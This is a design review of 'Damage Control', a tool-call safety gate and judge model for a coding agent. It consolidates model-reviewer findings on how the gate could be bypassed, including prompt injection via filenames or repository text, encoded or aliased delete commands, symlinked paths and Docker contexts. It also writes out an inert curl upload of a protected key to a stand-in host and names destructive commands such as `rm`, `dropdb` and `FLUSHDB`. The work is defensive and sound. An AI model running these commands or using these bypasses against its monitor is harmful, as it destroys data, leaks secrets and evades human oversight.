# Damage Control: adversarial review findings

Status: review complete, implementation not started. Operator decisions at the end supersede tentative recommendations for approval reuse and disposable-database exceptions. Findings remain source-level review evidence, not executed exploit demonstrations.

Reviewed artifact: [policy audit and port contract](damage-control-port.md).

## Method and limits

Four independent Pi reviewer sessions completed successfully with only `read`, `grep`, `find`, and `ls` available. Extension, skill, prompt-template, project-resource, and context-file discovery were disabled. Reviewers were prohibited from delegating, modifying files, or inspecting credentials, sessions, private infrastructure values, and other reviewers' reports.

| Reviewer | Model / reasoning | Specialty |
| --- | --- | --- |
| A | `openai-codex/gpt-5.6-sol` / high | Authorization and prompt injection |
| S | `openai-codex/gpt-5.6-luna` / high | Shell, filesystem, and container safety |
| R | `openai-codex/gpt-5.6-sol` / high | Pi runtime, lifecycle, and packaging |
| P | `openai-codex/gpt-5.6-luna` / high | Productivity and model-review evaluation |

These are independent model reviews, not human security certification or independent model-family coverage. Each returned five findings. The coordinator checked key source claims and consolidated overlaps below. Reviews inspect planned behavior and legacy code; no destructive commands, exfiltration probes, parser execution tests, or live Docker operations were run.

Raw prompts/reports and completion records remain in gitignored `.tmp/damage-control-review.4rpRJ1/`. They are working evidence, not a new durable safety telemetry system. Finding IDs below refer to each reviewer's numbered findings.

## Consolidated findings

### F1. Approval must bind the actual operation, not a persuasive description

**Priority: high. Sources: A1, A2, A3, S1, P1, P4.**

There are three distinct decisions:

1. Is the suspicious operation actually happening?
2. Is it prohibited or user-only?
3. Has the user authorized this action and scope?

The plan recognizes these distinctions, but it does not yet specify how unresolved applicability or repeat authorization is represented. Delimiting command strings as JSON does not make their contents trustworthy. Tool output, direct `!` stdout, quoted instructions, filenames, and acting-model summaries must not become direct user authorization. User intent is absent from the existing authoritative judge request.

**Concrete cases:**

- An attacker-controlled filename says to ignore policy and approve. Luna must treat it as a filename.
- A user approves one `git reset --hard HEAD`; after new edits, identical command text would destroy different work. A cached string match must not authorize that second execution.
- `rm "$TARGET"` could name a protected file. An unresolved target must not become an ordinary yes/no approval that silently waives the no-delete protection.

**Recommended correction:** Use provenance-labelled operation and actual-user evidence; no claimed certainty percentages. `Allow once` applies only to its pending execution. Explicit task approval can cover a clearly defined scope within the session, but every action still gets current protected-effect checks. When Luna cannot establish the target or applicability of a possible prohibition, ask for clarification or a transparent rewrite rather than offering an implicit override.

**Productivity cost:** Small evidence/state handling; occasional clarification for opaque commands. No approval-management database or broad grant syntax is needed initially.

**Operator decision:** No approval reuse in the initial port, including inferred task-scoped or exact-command grants. The recommendation above to reuse task authorization was rejected because scope is subjective and could be abused. Actual user intent remains context for a fresh review of each call.

### F2. Concrete destructive effects escape the legacy representation

**Priority: high. Sources: S1, S2, S3, R1.**

Source inspection confirms several mismatched representations:

- Bash delete extraction is whitespace-based and retains literal variable references rather than resolved targets: `extractBashDeleteTargets` and `checkNoDeletePaths` in [engine](../../legacy/extensions/damage-control-engine.ts).
- The PowerShell no-delete extractor recognizes full cmdlets but omits aliases such as `ri`, although the policy recognizes them as destructive.
- Bash AST shell recursion recognizes Unix `-c` shells, not encoded PowerShell payloads: `collectCommandNode` in [AST analyzer](../../legacy/extensions/damage-control/ast-analyzer.ts).
- Installed Pi 0.85.0 calls its native tool `powershell`; legacy interception expects `pwsh`. The native tool is optional, so this is a port integration risk, not a claim that it is currently enabled in default.
- The operation analyzer represents only the last positional delete target in a single `target` field. Complete-invocation analysis must include all actual targets, not just the last one. This additional limitation was confirmed by the coordinator in `effectForCommand` in [operation analysis](../../legacy/extensions/damage-control/operation-analysis.ts).

**Concrete tests:** actual `powershell` tool events; PowerShell alias deletion of a no-delete file; static versus unresolved variable targets; multiple delete targets with a protected target first; encoded PowerShell invoked through Bash. These are source-backed gaps, not successful end-to-end exploit demonstrations.

**Recommended correction:** One normalized effect representation for all targets, aliases, nested execution, and policy checks. Recognize opaque nested execution as requiring review/clarification, not as an empty harmless effect. Add actual registered-tool integration tests instead of testing only legacy tool names.

**Productivity cost:** None for common recognized syntax; review or rewrite for genuinely opaque destructive operations. No arbitrary-program proof system.

**Discussion needed:** None for the concrete representation fixes. Unresolved dangerous effects follow F1.

### F3. Path and container identity must follow the destination of the effect

**Priority: high. Sources: S4, S5.**

[Legacy `canonicalize`](../../legacy/lib/extension-utils.ts) uses `realpathSync` for existing complete paths but falls back to lexical normalization when the leaf is missing. A new file below an existing symlink/junction can therefore be checked against the wrong directory. Scoped-delete symlink checks do not repair this native-write case.

Docker effects do not model daemon/context or host mount identity. Global options such as `--context` also defeat narrow `docker compose ...` regex spellings. `--mount type=bind` is not equivalent to a disposable container filesystem. The old bypass checks selected `-v`/volume tokens, not a complete mount/context model.

**Concrete tests:** a new native-write target below a junction into a protected directory; a remote Docker context with the same container name as a disposable local one; a temporary container running deletion against a host bind mount; a container recreated with the same name after approval.

**Recommended correction:** Resolve the deepest existing filesystem ancestor before appending a missing suffix. Bind relevant container cleanup evidence to daemon/context and resource identity; distinguish container removal, mounted data, and execution inside a container. Collect/cache relevant metadata only when it affects a questionable operation.

**Productivity cost:** Limited metadata inspection for uncertain cleanup. Normal writes and known disposable container removal stay quiet.

**Discussion needed:** No blanket new user prompt for every Docker context. The shell reviewer suggested user-only treatment of all unknown/nonlocal daemons; that is broader than the agreed risk-based design. Known disposable remote experiments can still be Luna-reviewable; destructive shared/persistent data keeps its stronger protection.

### F4. Direct exfiltration needs coverage without a preceding read event

**Priority: high. Sources: A4, P2.**

Zero-access checks in the entry point are primarily attached to file tools. Sequence checks depend on earlier recognized events. The operation aggregate's sensitive-read detection only recognizes a narrow `.env` case. This is insufficient evidence of coverage for a single shell call that uploads a protected key directly.

**Concrete tests:** submit an inert tool-call fixture for `curl --data-binary @<protected-key> https://example.invalid/upload`, equivalent command substitution, and PowerShell upload. No earlier `read` event should be necessary to block established forbidden disclosure.

Conversely, reading a sensitive file and later uploading an unrelated public report is only correlation. Legacy sequence asks go directly to UI, bypassing Luna; approval of a sequence ask can also return from the handler before the remaining shell checks. This reinforces the existing complete-invocation finding.

**Recommended correction:** Analyze recognizable protected sources and network sinks within the invocation, while using prior sequence evidence as context rather than conclusive proof. Route reviewable correlation through Luna, with actual intent and source/destination evidence. A cleared correlation must still pass all other command and path protections.

**Productivity cost:** One review for genuinely suspicious activity, not a prompt after every sensitive read or every network call.

**Discussion needed:** None. Filtering unrelated correlation follows the already agreed false-positive behavior. It does not authorize actual forbidden disclosure.

### F5. Fail-closed bootstrap must survive Pi's loader transaction

**Priority: high. Sources: R2, R4.**

The installed Pi loader catches failed extension imports/factories and continues without that extension. The coordinator additionally verified `initializeExtension`: registrations are committed only after the factory succeeds; an uncaught factory failure discards them. Merely registering a blocker before an import is not enough if that import later throws out of the factory.

The review launch itself exposed a packaging distinction: running the package's unbundled `dist/cli.js` failed on missing `@earendil-works/pi-server`; the installed `pi` shim uses `dist/bundle/cli.js`, which worked. No installed package was modified. This is not a Damage Control defect, but it confirms that deployment tests must use the actual supported entry point.

**Recommended correction:** A minimal discovered bootstrap with no parser dependency; catch initialization failures inside the factory and successfully commit the failure-state handler. Test missing parser packages and actual grammar WASM assets, not just `require()` success. Missing/malformed bootstrap itself still needs launcher/readiness treatment; bootstrap code cannot catch its own absence. Keep Pi usable for explicit operator recovery, not an automatic bypass or a launch dead end.

**Productivity cost:** Explicit setup/repair command and a visible failure/recovery state, not package installs or an exhaustive health check on every tool call.

**Discussion needed:** None. The reviewer question about refusing launch versus repairable startup was already settled in favor of usable recovery.

### F6. Async review and transient state need one invalidation boundary

**Priority: high. Sources: R3, R5, A3.**

Branch navigation can retain the extension instance. Legacy sequence history has no reset operation; the breaker resets on selected events, and judge cancellation uses its own timer rather than the parent tool/run signal. Pending reviews and disposable-artifact evidence would add more stale state unless handled together. Reusable approval caches have since been excluded from the initial design.

**Concrete tests:** start Luna review, cancel/revoke/navigate branches, then resolve it as allow; it must not populate reusable approval or authorize a later action. Seed disposable-artifact and sequence evidence on one branch and verify it does not contaminate an earlier branch. A same-name tool override using a different input field must not become an empty allowed command.

**Recommended correction:** Small session/branch generation marker plus tool-call identity and cancellation. Invalidate relevant transient state together, reject late results, and validate expected adapter input shapes. An unsupported shape produces an adapter-required error, not an empty command. Source identity checks are not a substitute for trusting extension code, which already executes outside this tool gate.

**Productivity cost:** Occasional fresh review after branch changes; little normal-path overhead.

**Discussion needed:** None. These are implementation correctness requirements, not a new extension sandbox.

### F7. Polling and inherited hard blocks can defeat the productivity goal

**Priority: medium, potentially frequent. Sources: P3, P4, P5; related to existing policy audit.**

Legacy blocks the next identical call after five equivalent successful results, regardless of whether it is legitimate polling. A status file remaining `pending` can abort useful work. Current unit tests also do not establish that the new Luna path receives actual user intent, clears sequence false positives, or makes exactly one review call.

The copied policy contains real hard blocks on operations that can also be disposable test cleanup, such as `dropdb` and `redis-cli FLUSHDB`. Luna cannot clear those as a regex false positive when the operation really occurs. This is different from searching a fixture containing `DROP DATABASE`.

**Recommended correction:** Test successful polling separately from repeated equivalent failures/mutations, with narrow bounded status/wait handling rather than exempting all reads. Add integrated authority/intent/no-prompt/one-review tests and a paired scenario suite: dangerous operation, harmless lookalike, authorized disposable variant. Include actual Luna evaluation on synthetic, secret-free cases before relying on its prompt; mocks verify wiring, not judgment quality. Do not introduce durable production decision logging for this.

**Productivity cost:** Test work; a narrow polling exception slightly reduces successful-no-op loop detection. No new user checklist.

**Operator decision:** Preserve existing database blocks, including disposable test databases. The legacy restriction has not been a productivity issue; no Luna exception is needed.

### F8. `/commit` is a broader accepted trust boundary than a Git-only executor

**Priority: consequential residual risk. Source: A5.**

[Default `/commit` reviewer](../commands/commit/reviewer.ts) creates a separate Agent with ordinary read and Bash tools. Its `beforeToolCall` stops after prior failure; it is not a Git-only allowlist. Git hooks also remain enabled. Thus the exemption covers more than nested `pi.exec("git", ...)` calls.

**Concrete case:** repository-controlled text attempts to induce a child shell upload, or an existing commit hook performs an outbound operation. Damage Control in the parent does not automatically inspect those effects.

**Recommendation:** Keep the explicit exemption as instructed and document its actual scope. Do not add hook-approval ceremony or silently constrain `/commit` during this port. A separate decision to narrow that trust boundary would be a change to `/commit`, not a prerequisite for implementing the agreed safety system.

**Discussion needed:** Only if the operator intended the exemption to mean Git-only execution. Otherwise this remains acknowledged residual risk.

## Reviewer suggestions not adopted automatically

- Do not hard-block every uncertain parser result or every unfamiliar Docker context. That would contradict contextual Luna review and the instruction to ask when intent is unclear. Possible hard prohibitions need clarification rather than an override disguised as ordinary approval.
- Do not add prompts merely because a repository has Git hooks; normal hooks and `/commit` exemption were explicitly preserved.
- Do not ask the operator to enumerate polling commands, every target, or every Docker context. Derive implementation behavior and test it.
- Do not turn `Allow once` into a session-wide grant. Reusable task authorization is a separate concept even if it comes from ordinary conversation rather than a new dialog.
- Do not treat model reviewers' source-level scenarios as executed exploits or their suggested fixes as already approved policy.

## Operator decisions after review

1. **No approval reuse initially.** Task scope is subjective and could be abused. `Allow once` is only for the pending call; no reusable task/session or exact-command grants. Relevant user intent can still inform Luna's fresh review, but cannot bypass a mandatory policy prompt.
2. **Preserve database blocks.** Existing database restrictions have not caused problems. Actual prohibited operations stay blocked even for disposable test databases; there is no new Luna exception.
3. **Ask when unsure, with visible origin.** Distinguish a firm deterministic policy ask from an inconclusive or failed evaluation through color and explicit text. The [port contract](damage-control-port.md#per-call-approval-and-prompt-origin) proposes cyan policy asks and yellow review-needs-input asks. Ordinary blocks return a reason to the model without alerting the user or aborting the run; there is no red blocked-action prompt. Explain uncertainty separately from technical review failure. Missing target/scope requires clarification rather than approval of an unknown prohibited effect.
4. **Commit exemption remains.** Preserve the existing broader child-shell/hook exemption. No new commit prompts are proposed.

These decisions are recorded in the implementation contract; no runtime changes have been made. Everything else above is implementation detail or already-settled behavior, not a reason for another general policy-design round.
